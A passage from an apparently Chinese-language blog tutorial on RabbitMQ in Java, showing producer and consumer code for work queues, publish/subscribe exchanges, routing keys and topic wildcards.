class="line">        <span class="comment">//第一个参数：队列名</span></span><br><span class="line">        <span class="comment">//第二个参数代表是否自动确认收到消息，false代表手动编程来确认消息，这是MQ的推荐做法</span></span><br><span class="line">        <span class="comment">//第三个参数要传入DefaultConsumer的实现类</span></span><br><span class="line">        channel.basicConsume(</span><br><span class="line">            RabbitConstant.QUEUE_HELLOWORLD, <span class="literal">false</span>, <span class="keyword">new</span> <span class="title class_">Reciver</span>(channel));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span>  <span class="title class_">Reciver</span> <span class="keyword">extends</span> <span class="title class_">DefaultConsumer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Channel channel;</span><br><span class="line">    <span class="comment">//重写构造函数,Channel通道对象需要从外层传入，在handleDelivery中要用到</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Reciver</span><span class="params">(Channel channel)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(channel);</span><br><span class="line">        <span class="built_in">this</span>.channel = channel;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleDelivery</span><span class="params">(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, <span class="type">byte</span>[] body)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">         <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(body);</span><br><span class="line">         System.out.println(<span class="string">&quot;消费者接收到的消息：&quot;</span>+message);</span><br><span class="line"></span><br><span class="line">         System.out.println(<span class="string">&quot;消息的TagId：&quot;</span>+envelope.getDeliveryTag());</span><br><span class="line">        <span class="comment">//false只确认签收当前的消息，设置为true的时候则代表签收该消费者所有未签收的消息</span></span><br><span class="line">        channel.basicAck(envelope.getDeliveryTag(), <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单的获取连接—-创建通道Channel—–连接队列—–消费数据—–通过DefaultConsumer的实现类内方法完成数据处理，签收信息。</p>
<h2 id="Work-queues工作队列模式"><a href="#Work-queues工作队列模式" class="headerlink" title="Work queues工作队列模式"></a>Work queues工作队列模式</h2><p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/06/08/gbY3jS1ED8OLnRI.jpg"
                      alt="Screenshot_102.jpg"
                ></p>
<p>Work Queues：与入门程序的简单模式相比，多了一个或一些消费端，多个消费端共同消费同一个队列中的消息。<br>应用场景：对于任务过重或任务较多情况使用工作队列可以提高任务处理的速度。</p>
<p>Work Queues 与入门程序的简单模式的代码几乎是一样的。可以完全复制，并多复制一个消费者进行多个消费者同时对消费消息的测试。</p>
<p>其生产者代码为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderSystem</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, TimeoutException &#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> RabbitUtils.getConnection();</span><br><span class="line">        <span class="comment">//建立通道</span></span><br><span class="line">        <span class="type">Channel</span> <span class="variable">channel</span> <span class="operator">=</span> connection.createChannel();</span><br><span class="line">        <span class="comment">//连接队列</span></span><br><span class="line">        channel.queueDeclare(RabbitConstant.QUEUE_SMS, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">null</span>);</span><br><span class="line">		<span class="comment">//发送100条消息</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span> ; i &lt;= <span class="number">100</span> ; i++) &#123;</span><br><span class="line">            <span class="type">SMS</span> <span class="variable">sms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SMS</span>(<span class="string">&quot;乘客&quot;</span> + i, <span class="string">&quot;13900000&quot;</span> + i, <span class="string">&quot;您的车票已预订成功&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">jsonSMS</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>().toJson(sms);</span><br><span class="line">            channel.basicPublish(<span class="string">&quot;&quot;</span> , RabbitConstant.QUEUE_SMS , <span class="literal">null</span> , jsonSMS.getBytes());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;发送数据成功&quot;</span>);</span><br><span class="line">        <span class="comment">//注意关连接</span></span><br><span class="line">        channel.close();</span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其消费者为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SMSSender3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//建立长连接</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> RabbitUtils.getConnection();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Channel</span> <span class="variable">channel</span> <span class="operator">=</span> connection.createChannel();</span><br><span class="line">        <span class="comment">//连接队列</span></span><br><span class="line">        channel.queueDeclare(RabbitConstant.QUEUE_SMS, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果不写basicQos（1），则自动MQ会将所有请求平均发送给所有消费者</span></span><br><span class="line">        <span class="comment">//basicQos(1)的调用会使得MQ不再对消费者一次发送多个请求</span></span><br><span class="line">        <span class="comment">//而是消费者处理完一个消息后（确认后），在从队列中获取一个新的</span></span><br><span class="line">        channel.basicQos(<span class="number">1</span>);<span class="comment">//处理完一个取一个</span></span><br><span class="line">		<span class="comment">//获取到队列之后消费消息</span></span><br><span class="line">        channel.basicConsume(RabbitConstant.QUEUE_SMS , <span class="literal">false</span> , </span><br><span class="line">                             <span class="comment">//这里是匿名内部类的创建</span></span><br><span class="line">                             <span class="keyword">new</span> <span class="title class_">DefaultConsumer</span>(channel)&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleDelivery</span><span class="params">(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, <span class="type">byte</span>[] body)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                <span class="comment">//完成消息的处理</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">jsonSMS</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(body);</span><br><span class="line">                System.out.println(<span class="string">&quot;SMSSender3-短信发送成功:&quot;</span> + jsonSMS);</span><br><span class="line">				<span class="comment">//</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">500</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                channel.basicAck(envelope.getDeliveryTag() , <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>和基本消息模型的区别在于，有多个消费者，他们会分批获取一定量的消息。</p>
<h2 id="订阅模式"><a href="#订阅模式" class="headerlink" title="订阅模式"></a>订阅模式</h2><p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/06/09/czkDRCviZydPf8b.jpg"
                      alt="Screenshot_103.jpg"
                ></p>
<p>在订阅模型中，多了一个 Exchange 角色，而且过程略有变化：<br>P：生产者，也就是要发送消息的程序，但是不再发送到队列中，而是发给X（交换机）<br>C：消费者，消息的接收者，会一直等待消息到来<br>Queue：消息队列，接收消息、缓存消息<br>Exchange：交换机（X）。一方面，接收生产者发送的消息。另一方面，知道如何处理消息，例如递交给某个特别队列、递交给所有队列、或是将消息丢弃。到底如何操作，取决于Exchange的类型。</p>
<p>Exchange有常见以下3种类型：<br>Fanout：广播，将消息交给所有绑定到交换机的队列<br>Direct：定向，把消息交给符合指定routing key 的队列<br>Topic：通配符，把消息交给符合routing pattern（路由模式） 的队列<br>Exchange（交换机）只负责转发消息，不具备存储消息的能力，因此如果没有任何队列与 Exchange 绑定，或者没有符合路由规则的队列，那么消息会丢失！</p>
<h3 id="基本订阅模式"><a href="#基本订阅模式" class="headerlink" title="基本订阅模式"></a>基本订阅模式</h3><p>基本的订阅模式，也就是生产者发送数据，交换机根据绑定情况【队列会绑定交换机】发送给目标队列。</p>
<p>队列再进行消费消息。</p>
<p>生产者代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WeatherBureau</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//长连接</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> RabbitUtils.getConnection();</span><br><span class="line">        <span class="comment">//获取输入消息</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in).next();</span><br><span class="line">        <span class="comment">//建立通道</span></span><br><span class="line">        <span class="type">Channel</span> <span class="variable">channel</span> <span class="operator">=</span> connection.createChannel();</span><br><span class="line">		<span class="comment">//发布消息</span></span><br><span class="line">        <span class="comment">//第一个参数交换机名字   其他参数和之前的一样</span></span><br><span class="line">        channel.basicPublish(RabbitConstant.EXCHANGE_WEATHER,<span class="string">&quot;&quot;</span> , <span class="literal">null</span> , input.getBytes());</span><br><span class="line"></span><br><span class="line">        channel.close();</span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看得出生产者代码和基本消息、工作队列的区别是不需要建立\获取队列，仅仅只需要发布消息，然后在消息发布中确定好对应的交换机名称。说明是对着交换机进行消息发送。</p>
<p>消费者代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sina</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//获取TCP长连接</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> RabbitUtils.getConnection();</span><br><span class="line">        <span class="comment">//获取虚拟连接通道</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Channel</span> <span class="variable">channel</span> <span class="operator">=</span> connection.createChannel();</span><br><span class="line">        <span class="comment">//声明队列信息  RabbitConstant.QUEUE_SINA  队列名</span></span><br><span class="line">        channel.queueDeclare(RabbitConstant.QUEUE_SINA, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//queueBind用于将队列与交换机绑定</span></span><br><span class="line">        <span class="comment">//参数1：队列名 参数2：交互机名  参数三：路由key（暂时用不到)</span></span><br><span class="line">        channel.queueBind(RabbitConstant.QUEUE_SINA, RabbitConstant.EXCHANGE_WEATHER, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        channel.basicQos(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//消费消息</span></span><br><span class="line">        channel.basicConsume(RabbitConstant.QUEUE_SINA , <span class="literal">false</span> , </span><br><span class="line">                             <span class="keyword">new</span> <span class="title class_">DefaultConsumer</span>(channel)&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleDelivery</span><span class="params">(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, <span class="type">byte</span>[] body)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                <span class="comment">//消息处理</span></span><br><span class="line">                System.out.println(<span class="string">&quot;新浪天气收到气象信息：&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(body));</span><br><span class="line">                channel.basicAck(envelope.getDeliveryTag() , <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>交换机需要与队列进行绑定，绑定之后；一个消息可以被多个消费者都收到。</li>
<li>发布&#x2F;订阅模式需要设置队列和交换机的绑定，工作队列模式不需要设置，实际上工作队列模式会将队列绑定到默认的交换机 </li>
<li>发布订阅模式与工作队列模式的区别：<br> 工作队列模式不用定义交换机，而发布&#x2F;订阅模式需要定义交换机<br> 发布&#x2F;订阅模式的生产方是面向交换机发送消息，工作队列模式的生产方是面向队列发送消息(底层使用默认交换机)</li>
</ol>
<h3 id="Routing-路由模式"><a href="#Routing-路由模式" class="headerlink" title="Routing 路由模式"></a>Routing 路由模式</h3><p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/06/09/64jauZ9CcQltSRM.jpg"
                      alt="Screenshot_104.jpg"
                ></p>
<p>队列与交换机的绑定，不能是任意绑定了，而是要指定一个 RoutingKey（路由key）</p>
<p>消息的发送方在向 Exchange 发送消息时，也必须指定消息的 RoutingKey</p>
<p>Exchange 不再把消息交给每一个绑定的队列，而是根据消息的 Routing Key 进行判断，只有队列的Routingkey 与消息的 Routing key 完全一致，才会接收到消息</p>
<p>具体代码展示：</p>
<p>生产者：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WeatherBureau</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">area</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;String, String&gt;();</span><br><span class="line">        area.put(<span class="string">&quot;china.hunan.changsha.20201127&quot;</span>, <span class="string">&quot;中国湖南长沙20201127天气数据&quot;</span>);</span><br><span class="line">        area.put(<span class="string">&quot;china.hubei.wuhan.20201127&quot;</span>, <span class="string">&quot;中国湖北武汉20201127天气数据&quot;</span>);</span><br><span class="line">        area.put(<span class="string">&quot;china.hunan.zhuzhou.20201127&quot;</span>, <span class="string">&quot;中国湖南株洲20201128天气数据&quot;</span>);</span><br><span class="line">        area.put(<span class="string">&quot;us.cal.lsj.20201127&quot;</span>, <span class="string">&quot;美国加州洛杉矶20201127天气数据&quot;</span>);</span><br><span class="line"></span><br><span class="line">        area.put(<span class="string">&quot;china.hebei.shijiazhuang.20201128&quot;</span>, <span class="string">&quot;中国河北石家庄20201128天气数据&quot;</span>);</span><br><span class="line">        area.put(<span class="string">&quot;china.hubei.wuhan.2020112 8&quot;</span>, <span class="string">&quot;中国湖北武汉20201128天气数据&quot;</span>);</span><br><span class="line">        area.put(<span class="string">&quot;china.henan.zhengzhou.20201128&quot;</span>, <span class="string">&quot;中国河南郑州20201128天气数据&quot;</span>);</span><br><span class="line">        area.put(<span class="string">&quot;us.cal.lsj.20201128&quot;</span>, <span class="string">&quot;美国加州洛杉矶20201128天气数据&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> RabbitUtils.getConnection();</span><br><span class="line">        <span class="type">Channel</span> <span class="variable">channel</span> <span class="operator">=</span> connection.createChannel();</span><br><span class="line">		<span class="comment">// 发送数据</span></span><br><span class="line">        Iterator&lt;Map.Entry&lt;String, String&gt;&gt; itr = area.entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span> (itr.hasNext()) &#123;</span><br><span class="line">            Map.Entry&lt;String, String&gt; me = itr.next();</span><br><span class="line">            <span class="comment">//第一个参数交换机名字   第二个参数作为 消息的routing key</span></span><br><span class="line">            channel.basicPublish(RabbitConstant.EXCHANGE_WEATHER_ROUTING,me.getKey() , <span class="literal">null</span> , me.getValue().getBytes());</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        channel.close();</span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>消费者：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sina</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//获取TCP长连接</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> RabbitUtils.getConnection();</span><br><span class="line">        <span class="comment">//获取虚拟连接</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Channel</span> <span class="variable">channel</span> <span class="operator">=</span> connection.createChannel();</span><br><span class="line">        <span class="comment">//声明队列信息</span></span><br><span class="line">        channel.queueDeclare(RabbitConstant.QUEUE_SINA, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//指定队列与交换机以及routing key之间的关系</span></span><br><span class="line">        channel.queueBind(RabbitConstant.QUEUE_SINA, RabbitConstant.EXCHANGE_WEATHER_ROUTING, <span class="string">&quot;us.cal.lsj.20201127&quot;</span>);</span><br><span class="line">        channel.queueBind(RabbitConstant.QUEUE_SINA, RabbitConstant.EXCHANGE_WEATHER_ROUTING, <span class="string">&quot;china.hubei.wuhan.20201127&quot;</span>);</span><br><span class="line">        channel.queueBind(RabbitConstant.QUEUE_SINA, RabbitConstant.EXCHANGE_WEATHER_ROUTING, <span class="string">&quot;us.cal.lsj.20201128&quot;</span>);</span><br><span class="line">        channel.queueBind(RabbitConstant.QUEUE_SINA, RabbitConstant.EXCHANGE_WEATHER_ROUTING, <span class="string">&quot;china.henan.zhengzhou.20201012&quot;</span>);</span><br><span class="line"></span><br><span class="line">        channel.basicQos(<span class="number">1</span>);</span><br><span class="line">        channel.basicConsume(RabbitConstant.QUEUE_SINA , <span class="literal">false</span> , <span class="keyword">new</span> <span class="title class_">DefaultConsumer</span>(channel)&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleDelivery</span><span class="params">(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, <span class="type">byte</span>[] body)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;新浪天气收到气象信息：&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(body));</span><br><span class="line">                channel.basicAck(envelope.getDeliveryTag() , <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看得出来，具体的差别仅仅在于是否在绑定的时候添加routingKey。</p>
<h3 id="Topics"><a href="#Topics" class="headerlink" title="Topics"></a>Topics</h3><p><code>Topics</code>工作模式需要指定交换机的类型为<code>topic</code>，与<code>Direct</code>相比，都是可以根据<code>rourtingKey</code>把消息路由到不同的队列。只不过<code>Topic</code>类型的交换机可以让队列在绑定<code>routingKey</code> 的时候使用<strong>通配符</strong>！</p>
<p>routingKey一般都是有一个或多个单词组成，多个单词之间以.分割，例如： msg.qq</p>
<p>通配符规则：</p>
<ul>
<li><code>#</code>：匹配零个、一个或多个词</li>
<li><code>*</code>：匹配不多不少恰好1个词</li>
</ul>
<p>举例：</p>
<ul>
<li><code>msg.#</code>：能够匹配<code>msg.qq.friend</code> 或者 <code>msg.qq</code></li>
<li><code>msg.*</code>：只能匹配<code>msg.qq</code></li>
</ul>
<p>生产者发送消息：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Send</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">EXCHANGE_NAME</span> <span class="operator">=</span> <span class="string">&quot;topic_exchange_test&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取连接</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> ConnectionUtil.getConnection();</span><br><span class="line">        <span class="comment">// 获取通道</span></span><br><span class="line">        <span class="type">Channel</span> <span class="variable">channel</span> <span class="operator">=</span> connection.createChannel();</span><br><span class="line">        <span class="comment">// 声明exchange，指定类型为topic</span></span><br><span class="line">        channel.exchangeDeclare(EXCHANGE_NAME, <span class="string">&quot;topic&quot;</span>);</span><br><span class="line">        <span class="comment">// 消息内容1</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">message1</span> <span class="operator">=</span> <span class="string">&quot;发送QQ消息&quot;</span>;</span><br><span class="line">        <span class="comment">// 发送消息，并且指定routingKey为&#x27;msg.qq&#x27;</span></span><br><span class="line">        channel.basicPublish(EXCHANGE_NAME, <span class="string">&quot;msg.qq&quot;</span>, <span class="literal">null</span>, message1.getBytes());</span><br><span class="line">        System.out.println(<span class="string">&quot; [生产者] 发送消息1：&quot;</span> + message1);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 消息内容2</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">message2</span> <span class="operator">=</span> <span class="string">&quot;发送wechat消息&quot;</span>;</span><br><span class="line">        <span class="comment">// 发送消息，并且指定routingKey为&#x27;msg.wechat&#x27;</span></span><br><span class="line">        channel.basicPublish(EXCHANGE_NAME, <span class="string">&quot;msg.wechat&quot;</span>, <span class="literal">null</span>, message2.getBytes());</span><br><span class="line">        System.out.println(<span class="string">&quot; [生产者] 发送消息2：&quot;</span> + message2);</span><br><span class="line">        <span class="comment">// 关闭连接</span></span><br><span class="line">        channel.close();</span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码中发送了两个消息，routingKey分别为<code>msg.qq</code>和<code>msg.wechat</code>。</p>
<p>消费者接收消息</p>
<p>消费者1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Recv</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">QUEUE_NAME</span> <span class="operator">=</span> <span class="string">&quot;topic_exchange_queue_1&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">EXCHANGE_NAME</span> <span class="operator">=</span> <span class="string">&quot;topic_exchange_test&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取连接</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> ConnectionUtil.getConnection();</span><br><span class="line">        <span class="comment">// 获取通道</span></span><br><span class="line">        <span class="type">Channel</span> <span class="variable">channel</span> <span class="operator">=</span> connection.createChannel();</span><br><span class="line">        <span class="comment">// 声明队列</span></span><br><span class="line">        channel.queueDeclare(QUEUE_NAME, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 绑定队列到交换机，同时指定需要订阅的routingKey为&#x27;msg.qq&#x27;</span></span><br><span class="line">        channel.queueBind(QUEUE_NAME, EXCHANGE_NAME, <span class="string">&quot;msg.qq&quot;</span>);</span><br><span class="line">        <span class="comment">// 定义队列的消费者</span></span><br><span class="line">        <span class="type">DefaultConsumer</span> <span class="variable">consumer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultConsumer</span>(channel) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleDelivery</span><span class="params">(String consumerTag, </span></span><br><span class="line"><span class="params">                                   Envelope envelope, </span></span><br><span class="line"><span class="params">                                   BasicProperties properties,</span></span><br><span class="line"><span class="params">                                   <span class="type">byte</span>[] body)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                <span class="comment">// 获取消息</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(body);</span><br><span class="line">                System.out.println(<span class="string">&quot; [消费者1] 接收消息 : &quot;</span> + msg + <span class="string">&quot;!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 监听队列</span></span><br><span class="line">        channel.basicConsume(QUEUE_NAME, <span class="literal">true</span>, consumer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>消费者1队列的routingKey为<code>msg.qq</code>。</p>
<p>消费者2</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Recv2</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">QUEUE_NAME</span> <span class="operator">=</span> <span class="string">&quot;topic_exchange_queue_2&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">EXCHANGE_NAME</span> <span class="operator">=</span> <span class="string">&quot;topic_exchange_test&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取连接</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> ConnectionUtil.getConnection();</span><br><span class="line">        <span class="comment">// 获取通道</span></span><br><span class="line">        <span class="type">Channel</span> <span class="variable">channel</span> <span class="operator">=</span> connection.createChannel();</span><br><span class="line">        <span class="comment">// 声明队列</span></span><br><span class="line">        channel.queueDeclare(QUEUE_NAME, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 绑定队列到交换机，同时指定需要订阅的routingKey为&#x27;msg.*&#x27;</span></span><br><span class="line">        channel.queueBind(QUEUE_NAME, EXCHANGE_NAME, <span class="string">&quot;msg.*&quot;</span>);</span><br><span class="line">        <span class="comment">// 定义队列的消费者</span></span><br><span class="line">        <span class="type">DefaultConsumer</span> <span class="variable">consumer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultConsumer</span>(channel) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleDelivery</span><span class="params">(String consumerTag,</span></span><br><span class="line"><span class="params">                                   Envelope envelope, </span></span><br><span class="line"><span class="params">                                   BasicProperties properties,</span></span><br><span class="line"><span class="params">                                   <span class="type">byte</span>[] body)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                <span class="comment">// 获取消息</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(body);</span><br><span class="line">                System.out.println(<span class="string">&quot; [消费者2] receive: &quot;</span> + msg + <span class="string">&quot;!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 监听队列</span></span><br><span class="line">        channel.basicConsume(QUEUE_NAME, <span class="literal">true</span>, consumer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>消费者2队列的routingKey为<code>msg.*</code>。</p>
